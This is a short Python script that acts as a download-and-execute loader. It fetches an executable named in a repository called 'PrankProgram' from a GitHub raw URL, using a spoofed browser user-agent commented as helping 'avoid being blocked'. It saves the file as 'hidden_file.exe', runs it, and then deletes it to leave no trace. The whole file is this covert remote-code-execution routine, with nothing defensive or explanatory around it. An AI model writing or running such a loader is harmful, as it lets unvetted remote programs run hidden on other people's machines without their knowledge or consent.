import requests,subprocess, os
hidden_name = "hidden_file"
filename = hidden_name+".exe"

try:
    os.remove(filename)
except:
    pass


headers = {
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "User-Agent": "Mozilla/5.0"  # Helps avoid being blocked
}

url_content = requests.get(
    "https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe",
    headers=headers,
    )



with open(filename, "wb") as file_write:
    file_write.write(url_content.content)

directory = os.path.abspath(filename)
print(f"----> {directory}")
subprocess.run([directory])
os.remove(filename)

